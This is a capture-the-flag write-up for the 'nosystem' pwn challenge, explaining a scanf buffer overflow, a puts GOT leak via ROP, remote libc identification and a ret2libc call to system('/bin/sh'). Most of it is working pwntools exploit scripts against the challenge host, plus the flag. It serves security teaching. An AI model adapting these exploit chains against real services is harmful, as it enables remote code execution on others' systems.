# nosystem

---

### Challenge Description

> Four. Times. In. A. Row. Okay that's it, i'm just going to remove almost all functionalities in my program. Can't exploit it if there's nothing to exploit right?

> Interact with the service at 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg:30401

> Concept(s) Required:
> Address Space Layout Randomization, Global Offset Table, Ret2Libc

[nosystem.zip](https://github.com/caprinux/Cyberthon-2021-Training/files/6330555/nosystem.zip)

---

### Solution

_i suggest you read up on the required concepts before u read any further because i won't be explaining them_

We run the binary and it takes in a username and nothing else.

Reading the source code:

```c

int main()

{

    char username[256];
    
    ... puts(some cool ascii art here)...
    
    printf("Enter Username => ");
    scanf("%s", username);
    printf("Greetings %s!", username);

    return 0;
}
```

Okay. Once again, scanf does not limit our input and we have a buffer overflow. What next?

Heres what ret2libc come in. If we can overflow the buffer, then return to system("/bin/sh") in libc, we can get a shell.

However how the heck do we start you may be wondering? How do I know where LIBC is?

This is where the global offset table comes in (GOT for short). The GOT holds the LIBC addresses of common functions like printf, puts, scanf etc.

If we can find out where the `system()` function is in LIBC we can return to it. 

However, to find out the address of system(), we have to first find the address of `libc.base`.

We cannot find by merely debugging or whatever, as ASLR is enabled.

Definition of [ASLR](https://tinyurl.com/addresslr):  Address Space Layout Randomization (ASLR) is a computer security technique which involves randomly positioning the base address of an executable and the position of libraries, heap, and stack, in a process's address space.

Hence, we have to find all our addresses at runtime, and work with offsets.

Our exploit will be split into 2 parts, the first part will leak the libc base and the second part will pop the shell.

Since we have control over the return pointer, we will be doing this with `Return Oriented Programming Chains`. The idea is that you can basically define the flow of the program by continously returning to functions and gadgets.

From the source code, we can see that `puts()` was called. This means that `puts()` has been imported from the C library aka libc.

So we have talked about GOT holding the address of library functions, but you also have to know that the Procedure Linkage Table (PLT) holds the small instructions to execute these functions.

For our first ROP chain, we will want to leak a function in the global offset table, `puts` is an ideal candidate.

We want to puts(global offset table address) and then return to main() so we can continue sending more ROP chains.

This can be done by popping `puts GOT address` into `RDI` and then calling the `PUTS procedure` to print out the `GOT address of puts`.

```
payload 1 = overflow + p64(poprdi) + p64(putsgot) + p64(putsplt) + p64(main)
```

We move on to the second part of our exploit.

Now that we have the GOT of puts, which is also the PUTS offset from LIBC , we can find our LIBC base.

```
libc.base = putsgot - libc address of puts
```

Now with our libc base, we can find `system()` and `/bin/sh`.

This allows us to easily craft our next ROP chain:

```
payload2 = overflow + p64(poprdi) + p64(binsh) + p64(system))
```

and gives us our shell.

Now to get into the more technical details. How do we write our ROP chain at runtime?

```py
from pwn import * 
p = process('./nosystem')
elf = ELF('nosystem')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
rop = ROP(elf)

# chain 1
overflow = "A"*264
putsgot = elf.got['puts']
putsplt = elf.plt['puts']
main = elf.sym['main']
poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
p.clean()
p.sendline(overflow + p64(poprdi) + p64(putsgot) + p64(putsplt) + p64(main))

# receive putsgot leak
p.recvuntil("@!")
received = p.recvline()
leak = u64(received.ljust(8, "\x00")) # unpack address from bytes into integer
leak = leak - 2814749767106560 # puts prints a newline together with leak hence i remove it
print(hex(leak))

# chain 2
base = leak - libc.sym['puts'] # calculate libc base
libc.address = base
system = libc.sym['system']
binsh = next(libc.search('/bin/sh'))
p.clean()
log.info("base: " + hex(base))
log.info("system: " + hex(system))
log.info("binsh: " + hex(binsh))
log.info("leak: " + hex(leak))
p.sendline(overflow + p64(poprdi) + p64(binsh) + p64(system))
p.interactive()
```

Uh yeah. Something like that 😸

Okay I'm sure y'all are smart enough to figure that out urself 😜 If you need help feel free to dm me.

Anyways, if you run that locally, congrats! It works.

However, like I mentioned in past pwn writeup, scripts that work locally may not work remotely.

![image](https://user-images.githubusercontent.com/76640319/115136185-b9cd4f00-a050-11eb-81f2-41cc0e11e5be.png)

As you can see, I don't have a shell. What the heck!?

We missed out one crucial step. The server may not be using the same libc as us. Hence we have to leak the libc version as well.

That is simple. 

![image](https://user-images.githubusercontent.com/76640319/115136195-de292b80-a050-11eb-9bfc-6bfb8f2ec99e.png)

We can take our leak `[*] leak: 0x7f28d6d42d60` to help us find the libc.

Even though ASLR is enabled, offset doesnt change. Hence this `puts got address` will be the same for the same libc.

There are only libraries to help us find libc based on offsets.

![image](https://user-images.githubusercontent.com/76640319/115136229-1df01300-a051-11eb-98b4-be99301535d0.png)

https://libc.blukat.me/?q=puts%3A0x7f58444f2d60&l=libc6_2.19-0ubuntu6.15_amd64

We are presented with 3 possible libraries. One way to narrow it down can be leaking more GOT entries, or you can just try them one by one.

![image](https://user-images.githubusercontent.com/76640319/115136269-3f50ff00-a051-11eb-838f-f3a3df32fd16.png)

We download `libc6_2.19-0ubuntu6.15_amd64` and we modify our script, providing the path of this libc.

```py
from pwn import * 
p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30401)
elf = ELF('nosystem')
libc = ELF('libc6_2.19-0ubuntu6.15_amd64.so')
rop = ROP(elf)

# chain 1
overflow = "A"*264
putsgot = elf.got['puts']
putsplt = elf.plt['puts']
main = elf.sym['main']
poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
p.clean()
p.sendline(overflow + p64(poprdi) + p64(putsgot) + p64(putsplt) + p64(main))

# receive putsgot leak
p.recvuntil("@!")
received = p.recvline()
leak = u64(received.ljust(8, "\x00")) # unpack address from bytes into integer
leak = leak - 2814749767106560 # puts prints a newline together with leak hence i remove it
print(hex(leak))

# chain 2
base = leak - libc.sym['puts'] # calculate libc base
libc.address = base
system = libc.sym['system']
binsh = next(libc.search('/bin/sh'))
p.clean()
log.info("base: " + hex(base))
log.info("system: " + hex(system))
log.info("binsh: " + hex(binsh))
log.info("leak: " + hex(leak))
p.sendline(overflow + p64(poprdi) + p64(binsh) + p64(system))
p.interactive()
```

We 🔥 our script. And voila! 

![image](https://user-images.githubusercontent.com/76640319/115136322-a53d8680-a051-11eb-8acd-1d381bab6634.png)

```
CTFSG{n0_5y5t3m_n0_pr0bl3m_p0p_p0p_r3t}
```

---

### Teaser

Do we even need a chain 2... or even need to manually find gadgets for chain 1?

```py
HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30401

context.binary = elf = ELF('nosystem')
libc = ELF('libc6_2.19-0ubuntu6.15_amd64.so')

p = remote(HOST, PORT)

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.main()

p.sendline(flat({ 264: rop.chain()}))

p.recvuntil("@!")
received = p.recvline()

leak = u64(received.ljust(8, b"\x00"))
leak = leak - 2814749767106560
base = leak - libc.sym['puts']
libc.address = base

one_gadget = 0x46428 # rax == NULL

p.sendline(flat({ 264: p64(base+one_gadget)}))
p.clean()
p.interactive()
```
